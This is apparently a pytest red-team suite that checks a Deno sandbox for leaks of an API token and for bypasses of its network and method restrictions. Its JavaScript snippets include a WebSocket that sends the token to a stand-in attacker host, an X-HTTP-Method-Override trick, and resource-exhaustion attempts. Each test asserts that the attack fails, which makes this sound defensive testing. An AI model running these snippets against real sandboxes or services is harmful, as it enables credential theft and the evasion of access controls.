"""Red Team Attack Suite - Evening Audit Feb 25, 2026 by Cheenu.

These attack vectors focus on:
1. EventTarget/Event API abuse for token leakage
2. AsyncIterator/Generator manipulation
3. Deno-specific APIs that might bypass sandbox
"""

import asyncio
import json
from pathlib import Path

import pytest

from mistmind.sandbox import DenoSandbox


SECRET_TOKEN = "super-secret-api-token-12345"


@pytest.fixture
def deno_path():
    """Get path to Deno binary."""
    home = Path.home()
    deno_in_home = home / ".deno" / "bin" / "deno"
    
    if deno_in_home.exists():
        return str(deno_in_home)
    
    import shutil
    deno_in_path = shutil.which("deno")
    if deno_in_path:
        return deno_in_path
    
    pytest.skip("Deno not found")


@pytest.fixture
def sandbox(deno_path):
    """Create a Deno sandbox instance."""
    return DenoSandbox(deno_path=deno_path, timeout=5)


class TestFeb25EveningCheenuAttacks:
    """Novel attack vectors - Evening Feb 25 audit by Cheenu."""
    
    @pytest.mark.asyncio
    async def test_attack_eventtarget_listener_capture(self, sandbox):
        """Attack: Capture token reference through EventTarget listener closure.
        
        Strategy: Create an EventTarget, register listeners that capture token 
        in their closure, then trigger events that might leak the token through
        event object inspection or error handlers.
        """
        code = '''async () => {
            try {
                const target = new EventTarget();
                let captured = null;
                
                // Register listener that tries to capture token
                target.addEventListener('leak', (event) => {
                    // Try to access _token from parent scope
                    captured = typeof _token !== 'undefined' ? _token : null;
                    event.leakedToken = captured;
                });
                
                // Dispatch event
                const event = new CustomEvent('leak', {
                    detail: {attempt: 'eventtarget'}
                });
                target.dispatchEvent(event);
                
                // Try to extract from event
                return {
                    captured: captured,
                    eventDetail: event.detail,
                    eventTarget: event.target
                };
            } catch(e) {
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        assert SECRET_TOKEN not in result_str
        # _token should not be accessible
        assert result.get('captured') is None or result.get('captured') == 'undefined'
    
    @pytest.mark.asyncio
    async def test_attack_async_generator_yield_leak(self, sandbox):
        """Attack: Use async generator to yield token through iteration protocol.
        
        Strategy: Create an async generator that attempts to yield the token,
        then consume it through for-await-of or manual .next() calls.
        """
        code = '''async () => {
            try {
                // Define async generator that tries to yield token
                async function* tokenLeaker() {
                    // Try to access _token
                    const tok = typeof _token !== 'undefined' ? _token : 'UNDEFINED';
                    yield tok;
                    
                    // Try through mist.request.toString() as well
                    yield mist.request.toString();
                    
                    // Try through error stack
                    try {
                        throw new Error("leak attempt");
                    } catch(e) {
                        yield e.stack;
                    }
                }
                
                // Consume generator
                const leaked = [];
                for await (const item of tokenLeaker()) {
                    leaked.push(item);
                }
                
                return {leaked: leaked};
            } catch(e) {
                return {error: e.message, stack: e.stack};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        assert SECRET_TOKEN not in result_str
        # Verify token not in leaked array
        if 'leaked' in result:
            for item in result['leaked']:
                assert SECRET_TOKEN not in str(item)
    
    @pytest.mark.asyncio
    async def test_attack_finalization_registry_callback(self, sandbox):
        """Attack: Use FinalizationRegistry to capture token in cleanup callback.
        
        Strategy: Register objects with FinalizationRegistry callbacks that
        attempt to capture or leak the token during garbage collection.
        """
        code = '''async () => {
            try {
                let leakedValue = null;
                
                // Create FinalizationRegistry with callback
                const registry = new FinalizationRegistry((heldValue) => {
                    // Callback runs during GC - try to capture token
                    leakedValue = heldValue;
                });
                
                // Try to register token (if accessible)
                const obj = {dummy: true};
                const tokenValue = typeof _token !== 'undefined' ? _token : 'UNDEFINED';
                registry.register(obj, tokenValue);
                
                // Force object to be eligible for GC
                // (In practice, we can't force GC in Deno, but attacker might try)
                
                // Try to return what we captured
                return {
                    attempted: tokenValue,
                    leaked: leakedValue
                };
            } catch(e) {
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        assert SECRET_TOKEN not in result_str
        # Token should not be accessible
        assert result.get('attempted') == 'UNDEFINED' or SECRET_TOKEN not in str(result.get('attempted', ''))


class TestNetworkBypassAttacks:
    """Attacks attempting to bypass network restrictions."""
    
    @pytest.mark.asyncio
    async def test_attack_redirect_to_unauthorized_host(self, sandbox):
        """Attack: Try to use HTTP redirect to reach unauthorized hosts.
        
        Strategy: Make a request to an allowed Mist host, but the response
        might redirect to an attacker-controlled server. This tests if Deno
        follows redirects outside the allowlist.
        """
        code = '''async () => {
            try {
                // Try to fetch a URL that might redirect
                // In practice, Mist API won't redirect to attacker sites,
                // but we test if the sandbox blocks redirects properly
                const response = await fetch('https://api.mist.com/redirect-test', {
                    redirect: 'follow'
                });
                
                return {
                    url: response.url,
                    status: response.status,
                    redirected: response.redirected
                };
            } catch(e) {
                // Should fail because endpoint doesn't exist or auth fails
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        # Should error (invalid endpoint) or return Mist domain only
        if 'url' in result:
            # If it succeeded (unlikely), verify it stayed on Mist domains
            assert 'mist.com' in result['url'].lower()
    
    @pytest.mark.asyncio
    async def test_attack_websocket_connection_attempt(self, sandbox):
        """Attack: Try to open WebSocket connection to leak data.
        
        Strategy: Attempt to open a WebSocket connection to an attacker-controlled
        server to exfiltrate the token or API responses.
        """
        code = '''async () => {
            try {
                // Try to open WebSocket to attacker server
                const ws = new WebSocket('wss://attacker.example.com/leak');
                
                // Try to send token
                ws.onopen = () => {
                    const tok = typeof _token !== 'undefined' ? _token : 'UNDEFINED';
                    ws.send(JSON.stringify({token: tok}));
                };
                
                // Wait briefly for connection
                await new Promise(r => setTimeout(r, 500));
                
                return {attempt: 'websocket', status: ws.readyState};
            } catch(e) {
                // Should fail due to network restrictions
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        # Should error or fail, token should not leak
        assert SECRET_TOKEN not in result_str
        assert 'error' in result  # Should fail due to denied network access
    
    @pytest.mark.asyncio
    async def test_attack_dns_rebinding_simulation(self, sandbox):
        """Attack: Simulate DNS rebinding by using IP addresses.
        
        Strategy: Try to access Mist API via IP address instead of hostname,
        which might bypass hostname-based allowlists if not properly configured.
        """
        code = '''async () => {
            try {
                // Try to access via IP instead of hostname
                // (Using a fake IP - real Mist IPs would be dynamic)
                const response = await mist.request({
                    method: 'GET',
                    path: '/api/v1/self'
                });
                
                // Try to make a raw fetch with IP (should fail)
                const directFetch = await fetch('https://192.168.1.1/api/v1/self', {
                    headers: {'Authorization': 'Token fake-token'}
                });
                
                return {
                    mistWorked: !!response,
                    directFetchStatus: directFetch.status
                };
            } catch(e) {
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        # Token should not leak
        assert SECRET_TOKEN not in result_str
        # Direct fetch to IP should fail (not in allowlist)


class TestApiModeBypassAttacks:
    """Attacks attempting to bypass API mode restrictions."""
    
    @pytest.mark.asyncio
    async def test_attack_method_case_manipulation(self, sandbox):
        """Attack: Try HTTP methods with different casing to bypass checks.
        
        Strategy: Use 'DeLeTe' instead of 'DELETE' to see if case-normalization
        happens after security checks.
        """
        # Set to readonly mode (only GET allowed)
        sandbox.api_mode = 'readonly'
        sandbox.allowed_methods = ['GET']
        
        code = '''async () => {
            try {
                // Try DELETE with weird casing
                const result = await mist.request({
                    method: 'DeLeTe',
                    path: '/api/v1/orgs/test/sites/testsite'
                });
                return {leaked: true, result: result};
            } catch(e) {
                return {blocked: true, error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        # Should be blocked - we're in readonly mode
        assert result.get('blocked') == True or 'error' in result
        assert 'not allowed' in result.get('error', '').lower()
    
    @pytest.mark.asyncio
    async def test_attack_http_method_override_header(self, sandbox):
        """Attack: Try X-HTTP-Method-Override header to bypass restrictions.
        
        Strategy: Some APIs support X-HTTP-Method-Override header that allows
        sending POST but treating it as DELETE. Test if this bypasses our checks.
        """
        # Set to readwrite mode (GET/POST/PUT/PATCH, but no DELETE)
        sandbox.api_mode = 'readwrite'
        sandbox.allowed_methods = ['GET', 'POST', 'PUT', 'PATCH']
        
        code = '''async () => {
            try {
                // Try to use method override header to disguise DELETE as POST
                const url = new URL('https://api.mist.com/api/v1/orgs/test/sites/testsite');
                const response = await fetch(url.toString(), {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Token fake-token',
                        'Content-Type': 'application/json',
                        'X-HTTP-Method-Override': 'DELETE'
                    }
                });
                
                return {bypassed: true, status: response.status};
            } catch(e) {
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        # Token should not leak regardless
        assert SECRET_TOKEN not in result_str
        # This might succeed or fail depending on Mist API behavior,
        # but our sandbox can't prevent this at the Deno level since it's POST
        # (The real protection is server-side at Mist API)


class TestResourceExhaustionAttacks:
    """Attacks attempting resource exhaustion to cause security failures."""
    
    @pytest.mark.asyncio
    async def test_attack_promise_memory_leak(self, sandbox):
        """Attack: Create massive number of pending promises to exhaust memory.
        
        Strategy: Spawn millions of never-resolving promises hoping to cause
        OOM and potentially leak token in error messages or crash dumps.
        """
        code = '''async () => {
            try {
                const promises = [];
                // Try to create many pending promises
                for (let i = 0; i < 100000; i++) {
                    promises.push(new Promise(() => {})); // Never resolves
                }
                
                // Try to trigger token access during memory pressure
                const tok = typeof _token !== 'undefined' ? _token : 'UNDEFINED';
                
                return {created: promises.length, token: tok};
            } catch(e) {
                return {error: e.message};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        # Token should not leak even under memory pressure
        assert SECRET_TOKEN not in result_str
        if 'token' in result:
            assert result['token'] == 'UNDEFINED'
    
    @pytest.mark.asyncio
    async def test_attack_recursive_mist_requests(self, sandbox):
        """Attack: Trigger recursive mist.request calls to exhaust resources.
        
        Strategy: Create a pattern of recursive API calls that might cause
        stack overflow or resource exhaustion, potentially leaking token in
        error states.
        """
        code = '''async () => {
            try {
                let depth = 0;
                const maxDepth = 10; // Limited to avoid actual DOS
                
                async function recursiveCall() {
                    depth++;
                    if (depth < maxDepth) {
                        try {
                            // This will fail (invalid org) but tests recursion
                            await mist.request({
                                method: 'GET',
                                path: `/api/v1/orgs/fake-${depth}/sites`
                            });
                        } catch(e) {
                            // Ignore errors, keep recursing
                            await recursiveCall();
                        }
                    }
                }
                
                await recursiveCall();
                
                return {maxDepthReached: depth};
            } catch(e) {
                return {error: e.message, stack: e.stack};
            }
        }'''
        
        result = await sandbox.run_execute(code, SECRET_TOKEN, "api.mist.com")
        result_str = json.dumps(result)
        # Token should not leak in error messages or stack traces
        assert SECRET_TOKEN not in result_str
